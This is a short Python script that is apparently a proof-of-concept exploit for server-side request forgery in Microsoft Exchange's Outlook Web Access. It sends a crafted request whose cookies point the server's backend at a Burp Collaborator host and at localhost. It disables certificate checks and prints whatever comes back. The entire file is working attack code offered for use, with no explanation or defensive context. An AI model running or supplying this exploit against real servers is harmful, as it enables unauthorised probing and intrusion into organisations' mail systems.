import requests
import sys

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(url):
	vuln = url + '/owa/auth/an0th3r-ssrf.js'
	headers = {
	'User-Agent': 'Hello-World',
	'Cookie': 'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;',
	'Accept-Language': 'en',
	'Connection': 'close'
	}
	req = requests.get(vuln,headers=headers, verify=False)
	if req.status_code == 200:
		print(req.status_code)
		print(req.headers)
		print(req.text)
	else:
		print(req.status_code)
		print(req.headers)
		print(req.text)
exploit(sys.argv[1])
